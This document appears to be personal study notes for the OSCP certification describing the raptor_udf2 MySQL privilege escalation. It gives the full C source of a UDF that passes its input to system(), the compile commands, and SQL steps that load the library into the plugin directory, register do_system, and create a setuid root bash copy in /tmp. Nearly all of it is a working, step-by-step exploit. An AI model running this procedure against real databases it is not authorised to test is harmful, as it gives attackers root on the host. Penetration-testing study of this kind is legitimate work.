OSCP Book pg 781


[https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)

```bash - kali
sudo apt update && sudo apt install default-libmysqlclient-dev
```

```bash - kali
mousepad raptor_udf2.c
```

**raptor_udf2.c**
```c
#include <stdio.h>
#include <stdlib.h>
 
enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
 
typedef struct st_udf_args {
        unsigned int arg_count; // number of arguments
        enum Item_result *arg_type; // pointer to item_result
        char **args; // pointer to arguments
        unsigned long *lengths; // length of string args
        char *maybe_null; // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
        char maybe_null; // 1 if func can return NULL
        unsigned int decimals; // for real functions
        unsigned long max_length; // for string functions
        char *ptr; // free ptr for func data
        char const_item; // 0 if result is constant
} UDF_INIT;
 
int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
        if (args->arg_count != 1) {
                return(0);
        }
        system(args->args[0]);
        return(0);
}
 
char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
        return(0);
}
```

Transfer the above c file to target.

![[Python#Server]]
IF TARGET IS 64 bit version of debian, we need add -fPIC to the gcc command:

```bash - kali
gcc -g -c raptor_udf2.c -fPIC
```

```bash - kali
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

---
IF TARGET IS 32 bit, remember to add -m32:
```bash - kali
gcc -g -c raptor_udf2.c -fPIC -m32
```

```bash - kali
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc -m32
```
---
Transfer the files over the target.
[[Python#Server]]

Should have 3 files, like so:


Now log in locally:
```bash - kali
mysql -h localhost -u root -p
```

```sql - target
show databases;
```

```sql - target
use <DATABASE>;
```

The first step in this process is to discover where this installation of MySQL stores its UDFs. 

```sql - target
show variables like 'plugin_dir';
```


In this case, the directory is **/usr/lib/mysql/plugin/**. We'll use this directory name in the steps that follow.

We must also determine whether the database has been misconfigured to allow insecure handling of files.

```sql - target
SHOW VARIABLES LIKE "secure_file_priv";
```


At this point, all elements are in place to exploit this misconfiguration and obtain a root shell.

==Pay attention to the directories below, and where your files are:==

==/tmp/Tools/ vs /tmp/ vs /var/www/==

```sql - target
create table foo(line blob);
```

```SQL
insert into foo values(load_file('/<PATH_TO_FILE>/raptor_udf2.so'));
```

```SQL
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
```


if the /usr/lib/mysql/plugin directory give you error, try: 

```SQL
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
```

```SQL
create function do_system returns integer soname 'raptor_udf2.so';
```

If you get `MySQL Error “file too short”`:  https://emarcel.com/mysql-error-when-creating-function/

Turned out that “SELECT … INTO DUMPFILE” clause did not write a library properly into plugins’ directory in “/usr/lib/mysql/plugin/” (the file size is 1)

```
\! cp raptor_udf2.so /usr/lib/mysql/plugin/
```

```
\! ls -lah /usr/lib/mysql/plugin
```

Now we should see the filesize of raptor_udf2.so as something other than 1.

```SQL
select * from mysql.func;
```

| name | ret |  dl | type |
| ---| --- | --- | --- |  
| do_system | 2 |  raptor_udf2.so | function |

```SQL
select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
```


```SQL
exit
```

```bash
/tmp/rootbash -p
```


